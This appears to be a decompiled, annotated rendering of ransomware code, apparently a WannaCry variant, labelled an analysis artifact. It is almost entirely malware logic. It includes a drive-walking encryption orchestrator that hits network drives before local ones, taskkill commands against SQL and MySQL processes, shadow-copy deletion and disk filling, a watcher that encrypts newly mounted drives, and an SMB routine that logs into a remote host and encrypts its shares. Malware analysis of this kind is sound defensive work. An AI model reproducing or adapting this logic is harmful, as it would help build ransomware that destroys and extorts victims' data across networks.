// ============================================================================
// payload.dll - Batch 2: workers, persistence triggers, orchestrator, /f spread
// ----------------------------------------------------------------------------
// ANALYSIS ARTIFACT - readability render. Not buildable.
// ============================================================================

#include <windows.h>
#include <winsock2.h>
#include <time.h>

// ============================================================================
// sub_10004800 - read .res state file (136 bytes)
// ============================================================================
int sub_10004800(void)
{
    HANDLE FileA = CreateFileA(Buffer, 0x80000000, 1, NULL, 3, 0, NULL); // GENERIC_READ, OPEN_EXISTING
    if (FileA == INVALID_HANDLE_VALUE)
        return 0;
    DWORD NumberOfBytesRead;
    ReadFile(FileA, &pbBuffer, 0x88, &NumberOfBytesRead, NULL);
    CloseHandle(FileA);
    return 136;
}

// ============================================================================
// sub_10004640 - CryptGenRandom wrapper
// ============================================================================
BOOL __thiscall sub_10004640(HCRYPTPROV *this, BYTE *pbBuffer, DWORD dwLen)
{
    return CryptGenRandom(*(this + 1), dwLen, pbBuffer);
}

// ============================================================================
// sub_10003DE0 - crypto destructor: destroy keys, release provider
// ============================================================================
int __thiscall sub_10003DE0(HCRYPTPROV *this)
{
    if (*(this + 2)) { CryptDestroyKey(*(this + 2)); *(this + 2) = 0; }
    if (*(this + 3)) { CryptDestroyKey(*(this + 3)); *(this + 3) = 0; }
    if (*(this + 1)) { CryptReleaseContext(*(this + 1), 0); *(this + 1) = 0; }
    return 1;
}

// ============================================================================
// sub_100048C0 - .res heartbeat worker
// ============================================================================
void __stdcall __noreturn sub_100048C0(LPVOID lpThreadParameter)
{
    while (dword_1000F2DC == 0) {
        dword_1000F25C = time(NULL);
        sub_10004860();                             // write .res
        for (int i = 0; i < 25; ++i) {
            if (dword_1000F2DC != 0)
                goto done;
            Sleep(1000);
        }
    }
done:
    ExitThread(0);
}

// ============================================================================
// sub_10004860 - write .res state file (136 bytes)
// ============================================================================
int sub_10004860(void)
{
    HANDLE FileA = CreateFileA(Buffer, 0x40000000, 1, NULL, 4, 0x80, NULL); // GENERIC_WRITE, OPEN_ALWAYS
    if (FileA == INVALID_HANDLE_VALUE)
        return 0;
    DWORD NumberOfBytesWritten;
    WriteFile(FileA, &pbBuffer, 0x88, &NumberOfBytesWritten, NULL);
    CloseHandle(FileA);
    return 136;
}

// ============================================================================
// sub_10004730 - poll for .dky recovery key appearance
// ============================================================================
void __stdcall __noreturn sub_10004730(LPVOID lpThreadParameter)
{
    for (;;) {
        dword_1000F2D8 = sub_10004660((int)lpThreadParameter);
        if (dword_1000F2D8 != 0)
            break;
        Sleep(0x1388);                              // 5 s
    }
    ExitThread(0);
}

// ============================================================================
// sub_10005720 - watch for newly mounted drives
// ============================================================================
void __stdcall __noreturn sub_10005720(LPVOID lpThreadParameter)
{
    DWORD LogicalDrives = GetLogicalDrives();

    if (dword_1000F2D8 == 0) {
        for (;;) {
            Sleep(0xBB8);                           // 3 s
            DWORD prev = LogicalDrives;
            LogicalDrives = GetLogicalDrives();
            if (LogicalDrives != prev) {
                for (DWORD v3 = 2; dword_1000F2D8 == 0; ) {
                    if ((((LogicalDrives ^ prev) >> v3) & 1) != 0 &&  // newly appeared
                        ((prev >> v3) & 1) == 0) {
                        HANDLE t = CreateThread(NULL, 0, sub_10005670, (LPVOID)v3, 0, NULL);
                        if (t) CloseHandle(t);
                    }
                    if (++v3 >= 26)
                        break;
                }
                break;
            }
        }
    }
    ExitThread(0);
}

// ============================================================================
// sub_100049B0 - decryptor GUI watchdog
// ============================================================================
void __stdcall __noreturn sub_100049B0(LPVOID lpThreadParameter)
{
    if (FindWindowW(NULL, WindowName) == NULL) {
        for (;;) {
            if (dword_1000F260 > 0 && time(NULL) >= dword_1000EFAC)
                sub_10004920();                     // timer escalation: relaunch decryptor
            Sleep(0x1388);
        }
    }
    ExitThread(0);
}

// ============================================================================
// sub_100058C0 - MAIN ENCRYPTION ORCHESTRATOR
// ----------------------------------------------------------------------------
// Two-pass drive walk (network drives first, then local fixed), per drive:
// taskkill DB/Exchange/MySQL, encrypt, enumerate shares, kill shadow copies,
// fill disk, drop wallpaper+decryptor, sleep 60 s, repeat.
// ============================================================================
int sub_100058C0(void)
{
    sub_100017A0(Parameter);                        // context ctor
    int v10 = 0;

    if (sub_10001A70(Parameter, (HCRYPTKEY)FileName, sub_10005290, &dword_1000F2D8) != 0) {
        if (GetFileAttributesA("f.wry") == INVALID_FILE_ATTRIBUTES)
            sub_10001B40(10, 100);                  // wallpaper params

        if (dword_1000F248 == 0) {
            dword_1000F248 = time(NULL);
            sub_10004860();
            sprintf(Buffer, "%s f", "@WanaDecryptor@.exe");
            sub_10001000(Buffer, 0, NULL);          // launch decryptor /f
        }

        sub_100053C0(Parameter);                    // encrypt user-profile dirs first

        while (dword_1000F2D8 == 0) {
            InterlockedExchange(&Target, -1);
            sub_10001000(CommandLine, 0, NULL);     // cmd
            sub_10001000("taskkill /f /im MSSQL*", 0, NULL);
            sub_10001000("taskkill /f /im sql*", 0, NULL);
            sub_10001000("taskkill /f /im mysql*", 0, NULL);

            DWORD LogicalDrives = GetLogicalDrives();
            for (int i = 0; i < 2; ++i) {           // pass 0: network, pass 1: local
                for (int j = 25; j >= 2; --j) {     // Z: .. C:
                    char RootPathName[4] = { (char)(j + 'A'), ':', '\\', 0 };
                    if (dword_1000F2D8 != 0)
                        break;
                    if (((LogicalDrives >> j) & 1) == 0)
                        continue;

                    UINT type = GetDriveTypeW(RootPathName);
                    if (i == 0) {                   // network pass: only DRIVE_REMOTE (4)
                        if (type != 4) continue;
                    } else if (i == 1) {            // local pass: skip DRIVE_REMOTE
                        if (type == 4) continue;
                    }
                    sub_10005530(Parameter, j, 1);  // encrypt this drive
                }
            }

            InterlockedExchange(&Target, -1);
            int firstRound = (dword_1000F260 == 0);
            dword_1000F260 = time(NULL);
            sub_10004860();

            sub_10004A10(25, sub_10004EE0, 0);      // enumerate shares, drop wallpaper/decryptor

            if (GetFileAttributesA("n.wry") == INVALID_FILE_ATTRIBUTES) {
                sprintf(Buffer, "%s c", "@WanaDecryptor@.exe");
                sub_10001000(Buffer, 0, NULL);
            }

            if (firstRound) {
                sprintf(Buffer, "cmd.exe /c start /b %s v", "@WanaDecryptor@.exe");
                sub_10001000(Buffer, 0, NULL);      // decryptor /v
                sub_10005120(2);                    // shadow-copy kill / fill (system drive)

                for (int k = 25; k > 2; --k) {      // local fixed drives
                    if (dword_1000F2D8 != 0)
                        break;
                    if (((LogicalDrives >> k) & 1) != 0) {
                        char RootPathName[4] = { (char)(k + 'A'), ':', '\\', 0 };
                        if (GetDriveTypeW(RootPathName) == 3) // DRIVE_FIXED
                            sub_10005120(k);
                    }
                }
            }
            Sleep(0xEA60);                          // 60 s
        }
    }

    v10 = -1;
    return sub_100018A0(Parameter);                 // context dtor
}

// ============================================================================
// sub_100057B0 - /f <ip> targeted SMB encryption
// ============================================================================
int __cdecl sub_100057B0(struct in_addr in, LPCSTR lpUserName, LPCSTR lpPassword)
{
    sub_100017A0(Parameter);
    int v9 = 0;

    if (sub_10001A70(Parameter, (HCRYPTKEY)FileName, sub_10005290, &dword_1000F2D8) != 0) {
        WSADATA WSAData;
        WSAStartup(0x202, &WSAData);

        int v3 = sub_10001350(in, (int)MultiByteStr);            // connect
        int v4 = sub_10001390(v3, lpUserName, lpPassword);       // authenticate
        sub_10001470((LPCCH)MultiByteStr, sub_10005480, Parameter, 0); // enumerate shares, encrypt

        if (v4 != 0)
            sub_10001440(MultiByteStr);             // disconnect
        else if (dword_1000F264 == 0)
            goto cleanup;

        dword_1000F260 = time(NULL);
    cleanup:
        WSACleanup();
    }

    v9 = -1;
    return sub_100018A0(Parameter);
}
